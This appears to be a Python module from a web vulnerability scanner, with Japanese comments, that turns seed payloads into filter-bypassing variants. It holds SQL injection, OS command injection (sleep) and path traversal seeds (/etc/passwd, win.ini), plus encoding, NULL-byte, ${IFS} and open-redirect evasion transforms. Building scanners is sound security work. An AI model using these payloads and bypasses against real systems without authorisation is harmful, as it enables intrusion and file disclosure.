"""LLM 非依存の決定論的ペイロード変異（mutation）。

単一のシードペイロードを、URL エンコード/二重エンコード/NULL バイト/バックスラッシュ/
コメント挿入/大文字小文字混在といったバイパス変換で「変化」させた候補を返す純粋関数群。

:mod:`wscan.context_mutator`（反射文脈に基づく breakout 合成）とは相補的で、本モジュールは
「与えられたペイロードそのものの変形」を担う。素朴な正規化（二重 URL デコード、
``..`` ブラックリスト、拡張子チェック等）や軽量 WAF を突破する high/ultra 級の検出に用いる。

LLM 側の等価機能は :meth:`wscan.adaptive_payload.AdaptivePayloadEngine.mutate_payload`。
両者は :meth:`wscan.scanners.base.BaseScanner.mutated_payloads` から統合的に呼ばれる。
"""
from __future__ import annotations

from urllib.parse import quote

# max_payloads のキャップ順に埋もれて投入されない高価値ベース payload を mutation wave で
# 確実に投入する。特に blind 系（boolean/time）は固定リストの後方に並ぶため取りこぼしやすい。
BYPASS_SEEDS: dict[str, list[str]] = {
    "sqli": [
        "1 AND 1=1",            # boolean-based blind（scanner が partner を自動補完）
        "1' AND '1'='1",
        "1' AND SLEEP(3)-- -",  # time-based blind
    ],
    "os": ["; sleep 3", "| sleep 3", "& sleep 3"],
    "path_traversal": [
        "../../../../etc/passwd",
        "..\\..\\..\\..\\windows\\win.ini",
    ],
}

# path traversal の NULL バイト切詰めで使う代表的な拡張子。
_COMMON_EXTS = ("pdf", "html", "txt", "png")

# 1 フィールドあたりの変異候補の上限（コスト抑制）。mutation wave は未検出フィールドで
# 走り、フォームは payload 毎に再ナビゲートするため、過大だと所要時間を大きく押し上げる。
_MAX_VARIANTS = 12


def _url_encode(s: str) -> str:
    return quote(s, safe="")


def _double_url_encode(s: str) -> str:
    return quote(quote(s, safe=""), safe="")


def _encode_dots_slashes(s: str) -> str:
    """``.`` ``/`` ``\\`` のみを percent-encode（英数字は温存）。

    ``quote`` は ``.`` を unreserved 扱いで encode しないため、``..`` ブラックリストを
    突破するには明示的に dot を encode する必要がある。
    """
    return "".join("%%%02x" % ord(c) if c in "./\\" else c for c in s)


def _double_encode_dots_slashes(s: str) -> str:
    return _encode_dots_slashes(_encode_dots_slashes(s))


def _case_toggle(s: str) -> str:
    """英字を1文字おきに大小反転（SQL/OS キーワードの素朴なブラックリスト回避）。"""
    return "".join(c.upper() if i % 2 else c.lower() for i, c in enumerate(s))


def _insert_sql_comments(s: str) -> str:
    """空白を ``/**/`` に置換（空白依存の WAF シグネチャ回避）。"""
    return s.replace(" ", "/**/")


def _redirect_host(payload: str) -> str:
    """リダイレクト系ペイロードからホスト部分を取り出す。"""
    p = payload.strip()
    for pref in ("https://", "http://", "https:/", "http:/", "//", "/\\", "\\/"):
        if p.lower().startswith(pref):
            return p[len(pref):]
    return p.lstrip("/\\")


def mutate(payload: str, check_type: str) -> list[str]:
    """``payload`` を ``check_type`` に応じたバイパス変種へ「変化」させる（純粋関数）。"""
    if not payload:
        return []
    check = (check_type or "").lower()
    out: list[str] = [_url_encode(payload), _double_url_encode(payload)]

    if check == "sqli":
        out.append(_case_toggle(payload))
        out.append(_insert_sql_comments(payload))
    elif check == "os":
        out.append(payload.replace(" ", "${IFS}"))
        out.append("%0a" + payload.lstrip("; |&"))   # encoded newline 区切り
    elif check == "path_traversal":
        # ``..`` ブラックリスト + 拡張子チェックを「二重エンコード + NULL バイト + 拡張子」で
        # 回避する（アプリが受領後にさらに decode する素朴な実装を突破）。
        de = _double_encode_dots_slashes(payload)
        se = _encode_dots_slashes(payload)
        for ext in _COMMON_EXTS:
            out.append(f"{de}%2500.{ext}")   # 二重エンコード + 二重エンコード NULL
            out.append(f"{de}%00.{ext}")     # 二重エンコード + NULL
            out.append(f"{se}%00.{ext}")     # 単一エンコード + NULL
        out.append(payload.replace("../", "....//"))   # ``../`` 逐次除去対策
    elif check == "open_redirect":
        host = _redirect_host(payload)
        if host:
            out += [f"/\\{host}", f"\\/{host}", f"/%2f{host}",
                    f"https:/{host}", f"//{host}", f"/%09/{host}"]

    return _dedupe([v for v in out if v and v != payload])


def mutation_payloads(check_type: str, seeds: list[str] | None = None) -> list[str]:
    """mutation wave 用の候補列。高価値ベース + シード由来の変種を返す（純粋関数）。"""
    check = (check_type or "").lower()
    bases: list[str] = list(BYPASS_SEEDS.get(check, []))
    for s in (seeds or [])[:6]:
        if s and s not in bases:
            bases.append(s)
    out: list[str] = []
    for b in bases:
        out.append(b)                 # ベースそのもの（キャップで漏れた blind を確実に投入）
        out.extend(mutate(b, check))
    return _dedupe(out)[:_MAX_VARIANTS]


def _dedupe(items: list[str]) -> list[str]:
    seen: set[str] = set()
    out: list[str] = []
    for it in items:
        if it in seen:
            continue
        seen.add(it)
        out.append(it)
    return out
